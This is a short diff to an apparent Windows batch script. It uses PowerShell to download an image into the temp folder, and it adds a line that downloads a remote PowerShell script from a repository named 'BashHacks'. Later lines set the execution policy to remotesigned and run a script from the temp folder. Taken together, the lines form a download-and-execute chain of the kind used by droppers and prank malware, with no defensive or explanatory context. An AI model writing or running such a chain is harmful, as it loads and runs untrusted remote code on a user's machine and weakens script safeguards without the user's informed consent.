@@ -1,4 +1,5 @@
 powershell -Command "Invoke-WebRequest http://art-exlibris.net/images/large/exlibris_21693.jpg -OutFile %temp%\hatter.jpg"
+powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/FGabi01/BashHacks/master/run.ps1 -OutFile %temp%\run.ps1"
 timeout 1
 Powershell.exe set-executionpolicy remotesigned -File  %temp%\ps.ps1
 timeout 1
